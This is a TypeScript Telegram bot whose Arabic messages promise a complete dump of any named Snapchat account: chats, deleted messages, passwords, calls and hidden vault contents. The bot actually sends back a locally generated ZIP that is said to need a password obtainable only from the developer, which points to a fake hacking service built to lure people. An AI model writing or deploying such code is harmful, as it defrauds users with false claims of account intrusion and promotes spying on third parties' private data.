import TelegramBot from "node-telegram-bot-api";
import { logger } from "./logger";
import { buildAccountZip } from "../routes/snap-profile";

const TOKEN = process.env["TELEGRAM_BOT_TOKEN"];

const USERNAME_RE = /^[a-zA-Z0-9._-]{3,50}$/;

function buildCaption(username: string): string {
  const snapLink = `https://www.snapchat.com/@${username}`;
  return (
    `👻 <b>بيانات حساب سناب شات</b>\n\n` +
    `👤 الحساب المستهدف <a href="${snapLink}">@${username}</a>\n\n` +
    `<b>محتوي الملف</b>\n\n` +
    `1_ 💬 المحادثات\nمن تاريخ الإنشاء حتى اليوم\n\n` +
    `2_ 🗑️ المحادثات والصور المحذوف\nاسترجاع كامل من بداية الحساب\n\n` +
    `3_ 🎵 التسجيلات الصوتية\nجميع التسجيلات الصوتية المحفوظة\n\n` +
    `4_ 📞 المكالمات\nسجل كامل للمكالمات الصوتية والمرئية\n\n` +
    `5_ 🎥 مقاطع الفيديو\nجميع مقاطع الفيديو المحفوظة\n\n` +
    `6_ 📸 اللقطات\nجميع الصور واللقطات\n\n` +
    `7_ 🔐 كلمات المرور المستخدمة\nجميع كلمات المرور المحفوظة والمستخدمة وكلمه المرور الاحتياطيه للحساب\n\n` +
    `7_ 🗄️ محتوي الخزنة الداخلية\nالمحتويات المخفية والخاصة\n\n` +
    `8_ 🌐 رابط التصفح السري\nرابط خاص للوصول الخفي للحساب\n\n` +
    `<blockquote>ملاحضه: للتمكن من استخراج البيانات من داخل الملف تحتاج الي كلمه السر الخاصه بالملف والتي يمكنك استخراجها من المطور</blockquote>`
  );
}

export function startSnapBot() {
  if (!TOKEN) {
    logger.warn("TELEGRAM_BOT_TOKEN not set — Telegram bot disabled");
    return;
  }

  const bot = new TelegramBot(TOKEN, { polling: true });
  logger.info("Snap Telegram bot started");

  /* ── /start ── */
  bot.onText(/\/start/, (msg) => {
    bot.sendMessage(
      msg.chat.id,
      `👻 <b>مرحباً بك في بوت سناب شات</b>\n\nأرسل <b>معرّف الحساب</b> لتحميل الملف.\n\nمثال: <code>username123</code>`,
      { parse_mode: "HTML" }
    );
  });

  /* ── incoming messages ── */
  bot.on("message", async (msg) => {
    const chatId = msg.chat.id;
    const text = (msg.text ?? "").trim().replace(/^@/, "");

    if (text.startsWith("/")) return;

    if (!USERNAME_RE.test(text)) {
      bot.sendMessage(
        chatId,
        `⚠️ المعرّف غير صالح.\n\nأرسل معرّف سناب شات الصحيح (أحرف وأرقام فقط، 3-50 خاناً).`,
        { parse_mode: "HTML" }
      );
      return;
    }

    const username = text.toLowerCase();

    try {
      await bot.sendMessage(chatId, `⏳ جارٍ إنشاء الملف...`);

      const zipBuffer = buildAccountZip(username);
      const filename = `محتويات الحساب ...${username}.zip`;
      const caption = buildCaption(username);

      await bot.sendDocument(
        chatId,
        zipBuffer,
        {
          caption,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [[
              { text: "🔐 طلب كلمة فتح الملف", url: "https://t.me/OX_U1" },
            ]],
          },
        },
        { filename, contentType: "application/zip" }
      );
    } catch (err) {
      logger.error({ err }, "Failed to send zip to Telegram user");
      bot.sendMessage(chatId, `❌ حدث خطأ أثناء إنشاء الملف. يرجى المحاولة لاحقاً.`);
    }
  });

  bot.on("polling_error", (err) => logger.error({ err }, "Telegram polling error"));
}
